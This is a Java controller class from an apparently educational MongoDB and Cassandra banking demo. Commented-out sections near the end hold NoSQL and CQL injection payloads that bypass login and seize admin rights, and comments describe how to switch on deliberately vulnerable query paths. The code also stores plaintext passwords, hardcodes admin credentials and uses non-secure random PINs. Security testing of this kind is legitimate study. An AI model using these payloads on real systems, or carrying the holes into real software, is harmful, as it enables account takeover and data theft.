package pl.polsl.mateusz.jachimczak.mongo.and.cassandra.controller;

import com.datastax.driver.core.Row;
import com.mongodb.BasicDBObject;
import com.mongodb.MongoClient;
import com.mongodb.client.MongoCollection;
import com.mongodb.client.MongoCursor;
import pl.polsl.mateusz.jachimczak.mongo.and.cassandra.model.Account;
import pl.polsl.mateusz.jachimczak.mongo.and.cassandra.model.User;
import pl.polsl.mateusz.jachimczak.mongo.and.cassandra.model.cassandra.CassAccountDAOImpl;
import pl.polsl.mateusz.jachimczak.mongo.and.cassandra.model.cassandra.CassTables;
import pl.polsl.mateusz.jachimczak.mongo.and.cassandra.model.cassandra.CassUserDAOImpl;
import pl.polsl.mateusz.jachimczak.mongo.and.cassandra.model.cassandra.CassandraConnector;
import pl.polsl.mateusz.jachimczak.mongo.and.cassandra.model.mongo.AccountDAOImpl;
import pl.polsl.mateusz.jachimczak.mongo.and.cassandra.model.mongo.MongoDBJDBC;
import pl.polsl.mateusz.jachimczak.mongo.and.cassandra.model.mongo.UserDAOImpl;

import javax.servlet.http.HttpServletRequest;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class DatabaseOperationsHandler {
    private static DatabaseOperationsHandler instance = null;
    private UserDAOImpl usersDAO;
    private AccountDAOImpl accountsDAO;
    private CassUserDAOImpl cassUsersDAO;
    private CassAccountDAOImpl cassAccountsDAO;


    protected DatabaseOperationsHandler() {
        usersDAO = new UserDAOImpl();
        accountsDAO = new AccountDAOImpl();
        cassUsersDAO = new CassUserDAOImpl();
        cassAccountsDAO = new CassAccountDAOImpl();
    }

    public static DatabaseOperationsHandler getInstance() {
        if (instance == null)
            instance = new DatabaseOperationsHandler();
        return instance;
    }

    public MongoDBJDBC initializeAndGetDBInstance(HttpServletRequest request) {
        MongoClient mongo = (MongoClient) request.getServletContext().getAttribute("MONGO_CLIENT");
        MongoDBJDBC dbInstance = MongoDBJDBC.getInstance();
        dbInstance.setMongoClientAndInitializeDB(mongo, "clients");
        dbInstance.initializeCollections();
        return dbInstance;
    }

    public CassandraConnector initializeAndGetCassandraDBInstance(HttpServletRequest request) {
        CassandraConnector client = (CassandraConnector) request.getServletContext().getAttribute("CASSANDRA_CLIENT");
        return client;
    }

    public void initializeExampleDocuments(MongoDBJDBC dbInstance) {
        MongoCollection<BasicDBObject> userColl = dbInstance.getUserCollection();
        MongoCollection<BasicDBObject> accountColl = dbInstance.getAccountCollection();
        List<String> exampleUsersIds = new ArrayList<>();
        if (userColl.count() == 0) {
            List<User> users = usersDAO.createListOfExampleUsers();
            for (int i = 0; i < 10; i++) {
                usersDAO.insertUser(dbInstance.getUserCollection(), users.get(i));
                exampleUsersIds.add(usersDAO.findDocInCollection(dbInstance.getUserCollection(),
                        "username", users.get(i).getUsername()).get("_id").toString());
            }
            User admin = new User("Matthew", "Darkann", "93040702011", "admin", "admin12@");
            dbInstance.getUserCollection().insertOne(usersDAO.createAdminDocumentFromUserObject(admin));
        }
        if (accountColl.count() == 0) {
            List<Account> accounts = accountsDAO.createListOfExampleAccounts(exampleUsersIds);
            for (int i = 0; i < 10; i++)
                accountsDAO.insertAccount(dbInstance.getAccountCollection(), accounts.get(i));
        }
    }

    public void initializeExampleDataForCassandra(CassandraConnector cassandra) {
        CassTables cassTables = new CassTables();
        List<User> exampleUsers;
        List<Account> exampleAccounts;
        Integer id = 1;
        Boolean tablesExists = cassUsersDAO.checkIfUsersTableExists(cassandra.getSession());
        if (!tablesExists) {
            cassTables.createUserTable(cassandra.getSession());
            cassTables.createAccountTable(cassandra.getSession());
            exampleUsers = usersDAO.createListOfExampleUsers();
            for (User u : exampleUsers) {
                cassUsersDAO.insertUser(cassandra.getSession(), u, id);
                id++;
            }
            exampleAccounts = accountsDAO.createListOfExampleAccounts(cassUsersDAO.getAllUsersIds(cassandra.getSession()));
            for (Account a : exampleAccounts)
                cassAccountsDAO.insertAccount(cassandra.getSession(), a);
            User admin = new User("Matthew", "Darkann", "93040702011", "admin", "admin12@");
            cassUsersDAO.insertAdminUser(cassandra.getSession(), admin, id);
        }
    }

    //For security test ONLY
    //Uncomment data below and comment 'newUser' variable with method call 'usersDAO.insertUser' for unsecured access to data
    public void createNewUser(MongoDBJDBC dbInstance, String name, String surname, String pesel, String username, String password) {
        User newUser = new User(name, surname, pesel, username, password);
        Random randomGenerator = new Random();
//        String jsonData = "{ name: " + "'" + name + "'"
//                + ", surname: " + "'" + surname + "'"
//                + ", pesel: " + "'" + pesel + "'"
//                + ", username: " + "'" + username + "'"
//                + ", password: " + "'" + password + "'" + " }";
//        usersDAO.insertUser2(dbInstance.getUserCollection(), jsonData);
        usersDAO.insertUser(dbInstance.getUserCollection(), newUser);
        BasicDBObject newUserDoc = usersDAO.findDocInCollection(dbInstance.getUserCollection(), "username", username);
        String userID = newUserDoc.get("_id").toString();
        String accountNumber = "";
        String accountPin = "";
        Double accountBalance = 0.0;
        Integer pinCounter = 0;
        for (int i = 0; i < 20; i++) {
            accountNumber = accountNumber + randomGenerator.nextInt(10);
            if (pinCounter <= 3)
                accountPin = accountPin + randomGenerator.nextInt(10);
            pinCounter++;
            accountBalance = accountBalance + (randomGenerator.nextInt(51) * 1.25);
        }
        Account newUsersAccount = new Account(username, userID, accountNumber, accountPin, accountBalance);
        accountsDAO.insertAccount(dbInstance.getAccountCollection(), newUsersAccount);
    }

    public void createNewUserForCassandra(CassandraConnector client, String name, String surname, String pesel, String username, String password) {
        User newUser = new User(name, surname, pesel, username, password);
        Random randomGenerator = new Random();
        Integer userID = cassUsersDAO.getAllUsersIds(client.getSession()).size() + 1;
        cassUsersDAO.insertUser(client.getSession(), newUser, userID);
        String accountNumber = "";
        String accountPin = "";
        Double accountBalance = 0.0;
        Integer pinCounter = 0;
        for (int i = 0; i < 20; i++) {
            accountNumber = accountNumber + randomGenerator.nextInt(10);
            if (pinCounter <= 3)
                accountPin = accountPin + randomGenerator.nextInt(10);
            pinCounter++;
            accountBalance = accountBalance + (randomGenerator.nextInt(51) * 1.26);
        }
        Account newUsersAccount = new Account(username, userID.toString(), accountNumber, accountPin, accountBalance);
        cassAccountsDAO.insertAccount(client.getSession(), newUsersAccount);
    }

    public void editUserData(MongoDBJDBC dbInstance, List<String> listOfChanges) {
        String oldUsername = listOfChanges.get(0);
        String name = listOfChanges.get(1);
        String surname = listOfChanges.get(2);
        String pesel = listOfChanges.get(3);
        String username = listOfChanges.get(4);
        String password = listOfChanges.get(5);
        BasicDBObject oldUserData = usersDAO.findDocInCollection(dbInstance.getUserCollection(), "username", oldUsername);
        BasicDBObject oldAccountData = accountsDAO.findDocInCollection(dbInstance.getAccountCollection(), "username", oldUsername);
        User editedUserData = validateEditedUserData(name, surname, pesel, username, password, oldUserData);
        usersDAO.updateUser(dbInstance.getUserCollection(), oldUserData, editedUserData);
        String editedUserId = usersDAO.findDocInCollection(dbInstance.getUserCollection(), "username", editedUserData.getUsername()).get("_id").toString();
        Double oldAccountBalance = (Double) oldAccountData.get("accountBalance");
        Account editedAccountData = new Account(editedUserData.getUsername(), editedUserId,
                oldAccountData.get("accountNumber").toString(),
                oldAccountData.get("accountPin").toString(),
                oldAccountBalance);
        accountsDAO.updateAccount(dbInstance.getAccountCollection(), oldAccountData, editedAccountData);
    }

    public void editUserDataForCassandra(CassandraConnector client, List<String> listOfChanges) {
        String oldUsername = listOfChanges.get(0);
        String name = listOfChanges.get(1);
        String surname = listOfChanges.get(2);
        String pesel = listOfChanges.get(3);
        String username = listOfChanges.get(4);
        String password = listOfChanges.get(5);
        User oldUserData = cassUsersDAO.findUser(client.getSession(), oldUsername);
        User editedUserData = validateEditedUserDataForCassandra(name, surname, pesel, username, password, oldUserData);
        Integer userID = cassUsersDAO.getUserID(client.getSession(), oldUsername);
        cassUsersDAO.updateUser(client.getSession(), editedUserData, userID);
        Account oldAccountData = cassAccountsDAO.findAccount(client.getSession(), oldUsername);
        Account editedAccountData = new Account(editedUserData.getUsername(),
                userID.toString(),
                oldAccountData.getAccountNumber(),
                oldAccountData.getAccountPin(),
                oldAccountData.getAccountBalance());
        cassAccountsDAO.updateAccount(client.getSession(), editedAccountData);
    }

    public void deleteUserWithAccount(MongoDBJDBC dbInstance, String username) {
        BasicDBObject userDocToDelete = usersDAO.findDocInCollection(dbInstance.getUserCollection(), "username", username);
        BasicDBObject accountDocToDelete = accountsDAO.findDocInCollection(dbInstance.getAccountCollection(), "username", username);
        usersDAO.deleteUser(dbInstance.getUserCollection(), userDocToDelete);
        accountsDAO.deleteAccount(dbInstance.getAccountCollection(), accountDocToDelete);
    }

    public void deleteUserWithAccountForCassandra(CassandraConnector client, String username) {
        User userToDelete = cassUsersDAO.findUser(client.getSession(), username);
        Account accountToDelete = cassAccountsDAO.findAccount(client.getSession(), username);
        cassUsersDAO.deleteUser(client.getSession(), userToDelete);
        cassAccountsDAO.deleteAccount(client.getSession(), accountToDelete);
    }

    public void addAmountToAccountBalance(MongoDBJDBC dbInstance, Double amountToAdd, String username) {
        BasicDBObject oldAccountData = accountsDAO.findDocInCollection(dbInstance.getAccountCollection(), "username", username);
        Double newAccountBalance = ((Double) oldAccountData.get("accountBalance")) + amountToAdd;
        Account editedAccountData = new Account(username,
                oldAccountData.get("user_id").toString(),
                oldAccountData.get("accountNumber").toString(),
                oldAccountData.get("accountPin").toString(),
                newAccountBalance);
        accountsDAO.updateAccount(dbInstance.getAccountCollection(), oldAccountData, editedAccountData);
    }

    public void addAmountToAccountBalanceForCassandra(CassandraConnector client, Double amountToAdd, String username) {
        Account oldAccountData = cassAccountsDAO.findAccount(client.getSession(), username);
        Double newAccountBalance = oldAccountData.getAccountBalance() + amountToAdd;
        Account editedAccountData = new Account(username,
                oldAccountData.getUserID(),
                oldAccountData.getAccountNumber(),
                oldAccountData.getAccountPin(),
                newAccountBalance);
        cassAccountsDAO.updateAccount(client.getSession(), editedAccountData);
    }

    public void subAmountFromAccountBalance(MongoDBJDBC dbInstance, Double amountToSubtract, String username) {
        BasicDBObject oldAccountData = accountsDAO.findDocInCollection(dbInstance.getAccountCollection(), "username", username);
        Double newAccountBalance = ((Double) oldAccountData.get("accountBalance")) - amountToSubtract;
        Account editedAccountData = new Account(username,
                oldAccountData.get("user_id").toString(),
                oldAccountData.get("accountNumber").toString(),
                oldAccountData.get("accountPin").toString(),
                newAccountBalance);
        accountsDAO.updateAccount(dbInstance.getAccountCollection(), oldAccountData, editedAccountData);
    }

    public void subAmountFromAccountBalanceForCassandra(CassandraConnector client, Double amountToSubtract, String username) {
        Account oldAccountData = cassAccountsDAO.findAccount(client.getSession(), username);
        Double newAccountBalance = oldAccountData.getAccountBalance() - amountToSubtract;
        Account editedAccountData = new Account(username,
                oldAccountData.getUserID(),
                oldAccountData.getAccountNumber(),
                oldAccountData.getAccountPin(),
                newAccountBalance);
        cassAccountsDAO.updateAccount(client.getSession(), editedAccountData);
    }

    //For security test ONLY
    //Use commented variable below and also comment first 'if' body without return statement for unsecured access to data
    public Boolean authenticateUserCredentials(MongoDBJDBC dbInstance, String passedUsername, String passedPassword) {
        BasicDBObject foundUserData = usersDAO.findDocInCollection(dbInstance.getUserCollection(), "username", passedUsername);
        //BasicDBObject foundUserData = usersDAO.findDocInCollectionWith2Param(dbInstance.getUserCollection(), "username", passedUsername, "password", passedPassword);
        if (foundUserData != null) {
            String userPassword = foundUserData.get("password").toString();
            if (userPassword.equals(passedPassword))
                return true;
        }
        return false;
    }

    public Boolean authenticateUserCredentialsForCassandra(CassandraConnector client, String passedUsername, String passedPassword) {
        User foundUserData = cassUsersDAO.findUser(client.getSession(), passedUsername);
        if (foundUserData != null) {
            String userPassword = foundUserData.getPassword();
            if (userPassword.equals(passedPassword))
                return true;
        }
        return false;
    }

    //For security test ONLY
    //Add -> 'String password' to method arguments and use commented variable below for unsecured access to data
    public Boolean checkAdminFlag(MongoDBJDBC dbInstance, String username) {
        BasicDBObject userData = usersDAO.findDocInCollection(dbInstance.getUserCollection(), "username", username);
        //BasicDBObject userData = usersDAO.findDocInCollectionWith2Param(dbInstance.getUserCollection(), "username", username, "password", password);
        Object adminFlag = userData.get("admin");
        if (adminFlag != null && adminFlag.toString().equals("true"))
            return true;
        else
            return false;
    }

    public Boolean checkAdminFlagForCassandra(CassandraConnector client, String username) {
        Boolean adminFlag = cassUsersDAO.checkAdminFlag(client.getSession(), username);
        return adminFlag;
    }

    public List<String> getUserDataWithAccountBalance(MongoDBJDBC dbInstance, String username) {
        List<String> userDataWithBalance = new ArrayList<>();
        BasicDBObject userDoc = usersDAO.findDocInCollection(dbInstance.getUserCollection(), "username", username);
        BasicDBObject accountDoc = accountsDAO.findDocInCollection(dbInstance.getAccountCollection(), "username", username);
        userDataWithBalance.add(userDoc.get("name").toString());
        userDataWithBalance.add(userDoc.get("surname").toString());
        userDataWithBalance.add(userDoc.get("pesel").toString());
        userDataWithBalance.add(userDoc.get("username").toString());
        userDataWithBalance.add(userDoc.get("password").toString());
        userDataWithBalance.add(accountDoc.get("accountNumber").toString());
        userDataWithBalance.add(accountDoc.get("accountBalance").toString());
        return userDataWithBalance;
    }

    public List<String> getUserDataWithAccountBalanceFromCassandra(CassandraConnector client, String username) {
        List<String> userDataWithBalance = new ArrayList<>();
        User userData = cassUsersDAO.findUser(client.getSession(), username);
        Account accountData = cassAccountsDAO.findAccount(client.getSession(), username);
        userDataWithBalance.add(userData.getName());
        userDataWithBalance.add(userData.getSurname());
        userDataWithBalance.add(userData.getPesel());
        userDataWithBalance.add(userData.getUsername());
        userDataWithBalance.add(userData.getPassword());
        userDataWithBalance.add(accountData.getAccountNumber());
        userDataWithBalance.add(accountData.getAccountBalance().toString());
        return userDataWithBalance;
    }

    public List<String> getAllUsernames(MongoDBJDBC dbInstance) {
        List<String> usernamesList = new ArrayList<>();
        List<BasicDBObject> userDocs = new ArrayList<>();
        MongoCursor<BasicDBObject> cursor = dbInstance.getUserCollection().find().iterator();
        try {
            while (cursor.hasNext()) {
                userDocs.add(cursor.next());
            }
        } finally {
            cursor.close();
        }
        for (BasicDBObject o : userDocs)
            usernamesList.add(o.get("username").toString());
        return usernamesList;
    }

    public List<String> getAllUsernamesFromCassandra(CassandraConnector client) {
        List<String> listOfUsernames = cassUsersDAO.getAllUsernames(client.getSession());
        return listOfUsernames;
    }

    private User validateEditedUserData(String name, String surname, String pesel, String username, String password, BasicDBObject oldUserData) {
        String validatedName, validatedSurname, validatedPesel, validatedUsername, validatedPassword;
        if (name.equals("") || name == null)
            validatedName = oldUserData.get("name").toString();
        else
            validatedName = name;
        if (surname.equals("") || surname == null)
            validatedSurname = oldUserData.get("surname").toString();
        else
            validatedSurname = surname;
        if (pesel.equals("") || pesel == null)
            validatedPesel = oldUserData.get("pesel").toString();
        else
            validatedPesel = pesel;
        if (username.equals("") || username == null)
            validatedUsername = oldUserData.get("username").toString();
        else
            validatedUsername = username;
        if (password.equals("") || password == null)
            validatedPassword = oldUserData.get("password").toString();
        else
            validatedPassword = password;
        User validatedUserData = new User(validatedName, validatedSurname, validatedPesel, validatedUsername, validatedPassword);
        return validatedUserData;
    }

    private User validateEditedUserDataForCassandra(String name, String surname, String pesel, String username, String password, User oldUserData) {
        String validatedName, validatedSurname, validatedPesel, validatedUsername, validatedPassword;
        if (name.equals("") || name == null)
            validatedName = oldUserData.getName();
        else
            validatedName = name;
        if (surname.equals("") || surname == null)
            validatedSurname = oldUserData.getSurname();
        else
            validatedSurname = surname;
        if (pesel.equals("") || pesel == null)
            validatedPesel = oldUserData.getPesel();
        else
            validatedPesel = pesel;
        if (username.equals("") || username == null)
            validatedUsername = oldUserData.getUsername();
        else
            validatedUsername = username;
        if (password.equals("") || password == null)
            validatedPassword = oldUserData.getPassword();
        else
            validatedPassword = password;
        User validatedUserData = new User(validatedName, validatedSurname, validatedPesel, validatedUsername, validatedPassword);
        return validatedUserData;
    }

    public List<BasicDBObject> getListOfWholeAccountData(MongoDBJDBC dbInstance, String username) {
        List<BasicDBObject> userDocslist = new ArrayList<>();
        userDocslist.add(usersDAO.findDocInCollection(dbInstance.getUserCollection(), "username", username));
        userDocslist.add(usersDAO.findDocInCollection(dbInstance.getAccountCollection(), "username", username));
        return userDocslist;
    }

    public List<String> getListOfWholeAccountDataFromCassandra(CassandraConnector client, String username) {
        List<String> userAccountData = new ArrayList<>();
        Row rowFromUserTable = cassUsersDAO.getRawUserDataFromTable(client.getSession(), username);
        Row rowFromAccountTable = cassAccountsDAO.getRawAccountDataFromTable(client.getSession(), username);
        String userDataInfo = "[USERNAME|USER_ID|ADMIN_FLAG|NAME|PASSWORD|PESEL|SURNAME]";
        String accountDataInfo = "[USERNAME|ACC_BALANCE|ACC_NUMBER|ACC_PIN|USER_ID]";
        userAccountData.add(userDataInfo);
        userAccountData.add(rowFromUserTable.toString());
        userAccountData.add(accountDataInfo);
        userAccountData.add(rowFromAccountTable.toString());
        return userAccountData;
    }

    public Boolean checkIfUserExists(MongoDBJDBC dbInstance, String username) {
        BasicDBObject usernameToCheck = usersDAO.findDocInCollection(dbInstance.getUserCollection(), "username", username);
        if (usernameToCheck == null)
            return false;
        else
            return true;
    }

    public Boolean checkIfUserExistsInCassandraDB(CassandraConnector client, String username) {
        User usernameToCheck = cassUsersDAO.findUser(client.getSession(), username);
        if (usernameToCheck == null)
            return false;
        else
            return true;
    }

    //For security test ONLY - methods listed below are being used in Main class
    //Injection examples:
    //FOR MONGO_DB

//    public void testHack(MongoDBJDBC dbInstance) {
//        System.out.println("--INJECTION: Try to acquire user data--");
//        System.out.println("Creating JSON file:");
//        String hackJson = "{ username: { $ne: 1 }, password: { $ne: 1 } }";
//        System.out.println(hackJson);
//        System.out.println("Parsing JSON file to BSON");
//        System.out.println("Injecting file:");
//        BasicDBObject query = BasicDBObject.parse(hackJson);
//        System.out.println(query);
//        System.out.println("");
//        System.out.println("--Acquired document form DB:--");
//        System.out.println(dbInstance.getUserCollection().find(query).first());
//        System.out.println("--INJECTION: SUCCESSFUL--");
//        System.out.println("");
//    }
//
//    public void adminHackFirst(MongoDBJDBC dbInstance) {
//        System.out.println("--INJECTION: Try to acquire admin data--");
//        System.out.println("--Part 1: Using username: admin--");
//        System.out.println("Creating JSON file:");
//        String hackJson = "{ username: 'admin', password: { $ne: 1 } }";
//        System.out.println(hackJson);
//        System.out.println("Parsing JSON file to BSON");
//        System.out.println("Injecting file:");
//        BasicDBObject query = BasicDBObject.parse(hackJson);
//        System.out.println(query);
//        System.out.println("");
//        System.out.println("--Acquired document form DB:--");
//        System.out.println(dbInstance.getUserCollection().find(query).first());
//        System.out.println("--INJECTION: SUCCESSFUL--");
//        System.out.println("");
//    }
//
//    public void adminHackSecond(MongoDBJDBC dbInstance) {
//        System.out.println("--INJECTION: Try to acquire admin data--");
//        System.out.println("--Part 2: Search for admin flag--");
//        System.out.println("Creating JSON file:");
//        String hackJson = "{ username: { $ne: 1 }, password: { $ne: 1 }, admin: 'true' }";
//        System.out.println(hackJson);
//        System.out.println("Parsing JSON file to BSON");
//        System.out.println("Injecting file:");
//        BasicDBObject query = BasicDBObject.parse(hackJson);
//        System.out.println(query);
//        System.out.println("");
//        System.out.println("--Acquired document form DB:--");
//        System.out.println(dbInstance.getUserCollection().find(query).first());
//        System.out.println("--INJECTION: SUCCESSFUL--");
//        System.out.println("");
//    }

    //Injection examples:
    //FOR CASSANDRA

//    public void acquireAdminFlagInCassandra(CassandraConnector client) {
//        System.out.println("--INJECTION: Try to acquire admin privilege--");
//        List<String> listOfChanges = new ArrayList<>();
//        listOfChanges.add("zbysiu65");
//        listOfChanges.add("");
//        listOfChanges.add("");
//        listOfChanges.add("");
//        listOfChanges.add("");
//        listOfChanges.add("hacked', admin='true"); //<-- THIS WILL WORK ONLY IF admin IS A STRING TYPE IN DB!
//        System.out.println("Inserting fabricated data into UPDATE query...");
//        editUserDataForCassandra(client, listOfChanges);
//        System.out.println("DONE");
//        System.out.println("Getting results..");
//        Row row = client.getSession().execute("SELECT * FROM user.users WHERE username='zbysiu65' ALLOW FILTERING").one();
//        System.out.println("---------------------------------------------------------");
//        System.out.println(row);
//        System.out.println("---------------------------------------------------------" + System.lineSeparator());
//        System.out.println("--Injection successful--");
//    }


//    TEST FAILED! IT'S IMPOSSIBLE TO QUERY MULTIPLE SELECT STATEMENTS IN ONE EXECUTION!
//    public void acquireExtraData(CassandraConnector client) {
//        System.out.println("--INJECTION: Try to acquire extra data from DB--");
//        System.out.println("Preparing fabricated data: ");
//        String username = "abba";
//        String password = "bba' ALLOW FILTERING; SELECT * FROM user.users WHERE username='admin' AND password >='a";
//        System.out.println("Username: " + username);
//        System.out.println("Password: " + password);
//        System.out.println("---------------------------------------------------------------------------------------");
//        System.out.println("Inserting fabricated data into UPDATE query...");
//        User user = cassUsersDAO.findUser(client.getSession(), username, password);
//        System.out.println("--Acquired data--");
//        System.out.println("User data: " + user.getName() + " ," + user.getSurname() + " ," + user.getUsername() + " ," + user.getPassword() + ".");
//        System.out.println("--Injection successful--");
//    }
}
